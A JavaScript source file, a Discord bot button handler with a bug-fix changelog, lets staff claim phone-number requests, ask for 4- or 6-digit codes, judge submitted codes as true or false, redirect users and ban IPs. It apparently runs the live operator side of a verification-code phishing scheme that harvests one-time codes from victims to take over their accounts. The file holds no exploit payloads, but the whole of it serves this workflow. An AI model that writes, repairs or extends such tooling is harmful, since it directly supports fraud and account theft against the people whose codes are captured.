/**
 * buttons.js — Discord button interaction handler
 *
 * Fixes applied:
 *  - BUG 1: len4/len6 now correctly send length=4 / length=6 to the API
 *  - BUG 2: sendRetryEmbed properly defined (was called but never existed → ReferenceError)
 *  - BUG 4: unclaim now restores the Claim button so staff can reclaim
 *  - BUG 5: claim checks API response properly (API now uses WHERE status='pending')
 *  - BUG 7: all fetches use callStaffAction / callBanIP which have an 8-second timeout
 */

import {
    ButtonBuilder,
    ButtonStyle,
    ActionRowBuilder,
    EmbedBuilder,
} from "discord.js";
import { CONFIG } from "../config.js";
import { getRequestByPhone } from "../database.js";
import { getOperatorColor } from "../utils/colors.js";
import { formatPhone } from "../utils/formatters.js";
import { buildRetryEmbed } from "../utils/embedBuilder.js";
import { callStaffAction, callBanIP } from "../utils/api.js";

// ─── In-memory claim tracker (phone → userId) ────────────────────────────────
// Note: lost on bot restart — use DB for persistence if needed.
export const claimedBy = new Map();

// ─── Helpers ─────────────────────────────────────────────────────────────────

/** Returns a Ban IP button, or null if the IP is invalid/unknown. */
function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

/**
 * Safely edit the original message.
 * Wraps in try/catch so a stale interaction token never crashes the process.
 */
async function safeEditMessage(message, options) {
    try {
        await message.edit(options);
    } catch (e) {
        console.warn("⚠️  Could not edit message (stale?):", e.message);
    }
}

/**
 * Send a retry embed to the log channel after a false code.
 * (BUG 2 FIX: this function was called in falsecode but never defined)
 */
async function sendRetryEmbed(channel, row) {
    if (!channel) {
        console.warn("⚠️  sendRetryEmbed: log channel not found");
        return;
    }

    const embed = buildRetryEmbed(row);

    const buttons = [
        new ButtonBuilder()
            .setCustomId("truecode_" + row.phone)
            .setLabel("✅ True Code")
            .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId("falsecode_" + row.phone)
            .setLabel("❌ False Code")
            .setStyle(ButtonStyle.Danger),
    ];
    const banBtn = createBanIPButton(row.ip_address);
    if (banBtn) buttons.push(banBtn);

    const claimer = claimedBy.get(row.phone);

    await channel.send({
        content: claimer ? `<@${claimer}>` : undefined,
        embeds: [embed],
        components: [new ActionRowBuilder().addComponents(...buttons)],
    });
}

// ─── Main handler ─────────────────────────────────────────────────────────────

export async function handleButton(interaction) {
    const parts = interaction.customId.split("_");
    const action = parts[0];
    // Phone numbers can contain underscores (e.g. future-proofing) so re-join
    const payload = parts.slice(1).join("_");

    // ─── CLAIM ────────────────────────────────────────────────────────────────
    if (action === "claim") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });

        try {
            // API-side: UPDATE only WHERE status='pending' (BUG 5 fix — double-claim)
            const data = await callStaffAction("claim", phone, interaction.user.tag);

            if (!data.success) {
                await interaction.editReply({
                    content: "❌ " + (data.message || "Already claimed by another staff member."),
                });
                return;
            }

            claimedBy.set(phone, interaction.user.id);
            await interaction.editReply({
                content: `✅ Request **${formatPhone(phone)}** claimed by <@${interaction.user.id}>`,
            });

            const row = await getRequestByPhone(phone);
            if (row) {
                const color = getOperatorColor(row.operator);
                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle("📋 Request In Progress")
                    .setDescription(
                        `👤 Claimed by <@${interaction.user.id}>\n\n**🔧 Choose an action:**`
                    );

                const buttons = [
                    new ButtonBuilder()
                        .setCustomId("len4_" + phone)
                        .setLabel("🔢 4 digits")
                        .setStyle(ButtonStyle.Success),
                    new ButtonBuilder()
                        .setCustomId("len6_" + phone)
                        .setLabel("🔢 6 digits")
                        .setStyle(ButtonStyle.Success),
                    new ButtonBuilder()
                        .setCustomId("wrong_" + phone)
                        .setLabel("❌ Wrong Number")
                        .setStyle(ButtonStyle.Danger),
                    new ButtonBuilder()
                        .setCustomId("unclaim_" + phone)
                        .setLabel("↩️ Unclaim")
                        .setStyle(ButtonStyle.Secondary),
                ];
                const banBtn = createBanIPButton(row.ip_address);
                if (banBtn) buttons.push(banBtn);

                await safeEditMessage(interaction.message, {
                    embeds: [newEmbed],
                    components: [new ActionRowBuilder().addComponents(...buttons)],
                });
            }
        } catch (e) {
            console.error("Claim error:", e);
            await interaction.editReply({ content: "❌ Network error while claiming." });
        }
        return;
    }

    // ─── 4 DIGITS ─────────────────────────────────────────────────────────────
    // BUG 1 FIX: was callStaffAPI("set_length", phone, staffTag) — length never sent
    if (action === "len4") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 4);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + data.message });
                return;
            }
            await interaction.editReply({
                content: `✅ 4-digit code requested for ${formatPhone(phone)}`,
            });
            const row = await getRequestByPhone(phone);
            const color = getOperatorColor(row?.operator);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(color)
                .setTitle("⏳ Waiting for Code (4 digits)")
                .setDescription("👤 Claimed\n🔢 Code requested: **4 digits**");
            await safeEditMessage(interaction.message, {
                embeds: [doneEmbed],
                components: [],
            });
        } catch (e) {
            console.error("len4 error:", e);
            await interaction.editReply({ content: "❌ Error setting code length." });
        }
        return;
    }

    // ─── 6 DIGITS ─────────────────────────────────────────────────────────────
    // BUG 1 FIX: same as above but length=6
    if (action === "len6") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 6);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + data.message });
                return;
            }
            await interaction.editReply({
                content: `✅ 6-digit code requested for ${formatPhone(phone)}`,
            });
            const row = await getRequestByPhone(phone);
            const color = getOperatorColor(row?.operator);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(color)
                .setTitle("⏳ Waiting for Code (6 digits)")
                .setDescription("👤 Claimed\n🔢 Code requested: **6 digits**");
            await safeEditMessage(interaction.message, {
                embeds: [doneEmbed],
                components: [],
            });
        } catch (e) {
            console.error("len6 error:", e);
            await interaction.editReply({ content: "❌ Error setting code length." });
        }
        return;
    }

    // ─── WRONG NUMBER ─────────────────────────────────────────────────────────
    if (action === "wrong") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("wrong_number", phone, interaction.user.tag);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + data.message });
                return;
            }
            await interaction.editReply({
                content: `✅ Wrong number reported for ${formatPhone(phone)}`,
            });
            claimedBy.delete(phone);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444)
                .setTitle("❌ Wrong Number")
                .setDescription("❌ User has been redirected to re-enter their phone number.");
            await safeEditMessage(interaction.message, {
                embeds: [doneEmbed],
                components: [],
            });
        } catch (e) {
            console.error("wrong number error:", e);
            await interaction.editReply({ content: "❌ Error reporting wrong number." });
        }
        return;
    }

    // ─── UNCLAIM ──────────────────────────────────────────────────────────────
    // BUG 4 FIX: was removing all components — now restores the Claim button
    if (action === "unclaim") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("unclaim", phone, interaction.user.tag);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + data.message });
                return;
            }

            claimedBy.delete(phone);
            await interaction.editReply({
                content: `↩️ Request **${formatPhone(phone)}** unclaimed. Back to pending queue.`,
            });

            // Restore Claim button so staff can pick it up again immediately
            const reclaimBtn = new ButtonBuilder()
                .setCustomId("claim_" + phone)
                .setLabel("📋 Claim")
                .setStyle(ButtonStyle.Primary);

            const row = await getRequestByPhone(phone);
            const banBtn = row ? createBanIPButton(row.ip_address) : null;
            const btns = [reclaimBtn];
            if (banBtn) btns.push(banBtn);

            const unclaimedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x6b7280)
                .setTitle("📭 Request Unclaimed")
                .setDescription(
                    `↩️ Unclaimed by <@${interaction.user.id}>\nThis request is back in the pending queue.`
                );

            await safeEditMessage(interaction.message, {
                embeds: [unclaimedEmbed],
                components: [new ActionRowBuilder().addComponents(...btns)],
            });
        } catch (e) {
            console.error("Unclaim error:", e);
            await interaction.editReply({ content: "❌ Error unclaiming request." });
        }
        return;
    }

    // ─── TRUE CODE ────────────────────────────────────────────────────────────
    if (action === "truecode") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("true_code", phone, interaction.user.tag);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + data.message });
                return;
            }
            await interaction.editReply({
                content: `✅ Code validated for ${formatPhone(phone)}`,
            });
            claimedBy.delete(phone);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981)
                .setTitle("✅ Code Validated")
                .setDescription(
                    `👤 Validated by <@${interaction.user.id}>\nThe user is being redirected to the congratulations page.`
                );
            await safeEditMessage(interaction.message, {
                embeds: [doneEmbed],
                components: [],
            });
        } catch (e) {
            console.error("truecode error:", e);
            await interaction.editReply({ content: "❌ Error validating code." });
        }
        return;
    }

    // ─── FALSE CODE ───────────────────────────────────────────────────────────
    // BUG 2 FIX: sendRetryEmbed was called but never defined → now properly implemented above
    if (action === "falsecode") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("false_code", phone, interaction.user.tag);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + data.message });
                return;
            }
            await interaction.editReply({
                content: `❌ Code refused for ${formatPhone(phone)}. User must re-enter a new code.`,
            });

            // Mark the current embed as "Refused"
            const refusedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444)
                .setTitle("❌ Code Refused")
                .setDescription(
                    `❌ Refused by <@${interaction.user.id}>\nThe user has been redirected to enter a new code.`
                );
            await safeEditMessage(interaction.message, {
                embeds: [refusedEmbed],
                components: [],
            });

            // Send a fresh retry embed in the log channel
            const row = await getRequestByPhone(phone);
            if (row) {
                const channel = interaction.client.channels.cache.get(CONFIG.LOG_CHANNEL_ID);
                await sendRetryEmbed(channel, row);
            }
        } catch (e) {
            console.error("falsecode error:", e);
            await interaction.editReply({ content: "❌ Error refusing code." });
        }
        return;
    }

    // ─── BAN IP ───────────────────────────────────────────────────────────────
    if (action === "banip") {
        const ip = payload;
        await interaction.deferReply({ flags: 64 });

        if (!ip || ip === "unknown" || ip === "null") {
            await interaction.editReply({ content: "❌ Cannot ban: invalid IP address." });
            return;
        }

        try {
            const data = await callBanIP(ip, interaction.user.tag);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + data.message });
                return;
            }
            await interaction.editReply({
                content: `🚫 IP **${ip}** banned successfully!`,
            });
            const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444)
                .setTitle("🔨 IP Banned")
                .setDescription(`🚫 IP **${ip}** banned by <@${interaction.user.id}>`);
            await safeEditMessage(interaction.message, {
                embeds: [bannedEmbed],
                components: [],
            });
        } catch (e) {
            console.error("banip error:", e);
            await interaction.editReply({ content: "❌ Network error while banning IP." });
        }
        return;
    }

    // Unknown button — log and ignore
    console.warn("⚠️  Unknown button action:", action, "payload:", payload);
}
